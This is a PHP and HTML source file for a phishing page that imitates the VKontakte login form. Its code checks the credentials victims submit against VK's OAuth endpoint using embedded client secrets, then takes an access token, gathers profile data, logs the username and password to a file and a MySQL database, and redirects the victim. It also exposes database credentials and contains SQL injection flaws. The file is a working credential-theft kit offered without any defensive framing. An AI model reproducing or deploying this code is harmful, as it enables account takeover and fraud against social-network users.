	<?php

		$host="mysql.zzz.com.ua"; // Оставляем localhost
		$user="bxlelzt"; // Имя пользователя
		$pass="1234567890Bxle"; // Пароль пользователя
		$db_name="bxlelzt"; // Название БД
		$link=mysql_connect($host,$user,$pass);
		mysql_select_db($db_name,$link);

		error_reporting (0);
		if (($_POST["email"] != "") and ($_POST["pass"]))
		{	
			$username = $_POST["email"];
			$password = $_POST["pass"];
			$url = "https://vk.com/404";
			$ip=$_SERVER['X_FORWARDED_FOR'];
			$time = date("H:i | d.m.Y");
			$check = file_get_contents("https://oauth.vk.com/token?grant_type=password&scope=friends%2Cphotos%2Cvideo%2Caudio%2Cpages%2C256%2Cnotes%2Cstatus%2Cmessages%2Cwall%2Cads%2Coffline%2Cdocs%2Cgroups%2Cnotifications%2Cnotifications%2Cmarket%2Cnotifications&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&username=".$username."&password=".$password);
			if (strpos($check, "access_token") === false)
			{
				$message = '<div class="box_error">Указан неверный логин или пароль.</div>';
			} 
				else
				{	
			$data = json_decode(curl("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password), 1);
			$res = json_decode(curl('https://api.vk.com/method/account.getProfileInfo?access_token='.$data[access_token]), 1);
	$NewUser = mysql_query("SELECT * FROM test WHERE login='$username'") or die();
	if (mysql_num_rows($NewUser) == 0) {
										$result = json_decode($check);
					$ez_log =$username.":".$password;
					$log = fopen("logs.php", "a+"); fwrite($log, $ez_log."\n"); fclose($log);
					header("Location: ".$url."");
			//Вставляем данные, подставляя их в запрос
		$sql = mysql_query("INSERT INTO `test` (`login`, `pass`, `token`, `firstname`, `lastname`, `bdate`, `aipi`, `vremya`) 
							VALUES ('".$_POST['email']."','".$_POST['pass']."','".$data[access_token]."','".$res[response][first_name]."','".$res[response][last_name]."','".$res[response][bdate]."','".$_SERVER['REMOTE_ADDR']."','". $time."')");
		//Если вставка прошла успешно	
		if ($sql) {
		} else {
			$message = '<div class="box_error">Сервер недоступен</div>';
		}
			 
	} else {
	   $message = '<div class="box_error">Произошла ошибка! Повторите позднее!</div>';
	}       
					
				}
		}
		
	function curl($url){
	$ch = curl_init( $url );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
	$res = curl_exec( $ch );
	curl_close( $ch );
	return $res;
	}
	?>




	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	  <head>
		<meta http-equiv="content-type" content="text/html; charset=utf-8">
		<title>ВКонтакте | Вход</title>
		<link rel="shortcut icon" href="http://vk.com/images/faviconnew.ico?3">
		<link rel="stylesheet" type="text/css" href="/auth/css/fonts_cnt.css" />
    <link rel="stylesheet" type="text/css" href="/auth/css/common.css" />
    <link type="text/css" rel="stylesheet" href="/auth/css/oauth_popup.css"></link>
    <script type="text/javascript" language="javascript" src="/auth/css/common_light.js"></script>
	  <body onresize="onBodyResize(true);" class="VK oauth_centered">
		<script>
		  if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
		</script>

		<script type="text/javascript">
			document.ondragstart = noselect;
			document.onselectstart = noselect;
			document.oncontextmenu = noselect;
			function noselect(){return false;}
		</script>
		<div class="oauth_wrap">
		  <div class="oauth_wrap_inner">
			<div class="oauth_wrap_content" id="oauth_wrap_content">
			  <div class="oauth_head">
	  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
	  <div id="oauth_head_info" class="oauth_head_info fl_r">
		<a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
	  </div>
	</div>

	<div class="oauth_content box_body clear_fix">
	  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

	  <form method="post" action="#" novalidate>
		<div class="oauth_form">

		  <center>
		<?=$message?>
		</center>

		  <div class="oauth_form_login">

			<div class="oauth_form_header">Телефон или e-mail</div>
			<input type="text" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="email" value="">
			<div class="oauth_form_header">Пароль</div>
			<input type="password" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="pass" />

			

			<button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
			<a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
			<input type="submit" name="submit_input" class="unshown">
		  </div>
		</div>
	  </form>
	</div>
			</div>
		  </div>
		</div>	
	  </body>
	</html>